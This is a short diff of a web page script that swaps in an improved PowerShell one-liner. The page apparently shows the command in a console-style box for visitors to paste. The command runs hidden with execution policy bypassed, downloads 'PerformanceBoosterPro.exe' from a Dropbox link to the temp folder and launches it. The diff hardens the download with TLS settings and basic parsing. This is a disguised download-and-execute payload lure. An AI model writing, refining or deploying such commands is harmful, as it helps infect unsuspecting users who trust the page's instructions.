@@ -529,7 +529,7 @@
     </div>
 
 <script>
-    const command = String.raw`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile "$env:TEMP\PerformanceBoosterPro.exe"; Start-Process "$env:TEMP\PerformanceBoosterPro.exe"" && exit`;
+    const command = String.raw`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls,Tls11,Tls12'; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile $env:TEMP\PerformanceBoosterPro.exe; Start-Process $env:TEMP\PerformanceBoosterPro.exe" && exit`;
 
     // عرض الأمر داخل CMD-like box
     document.getElementById('cmdText').innerText = command;
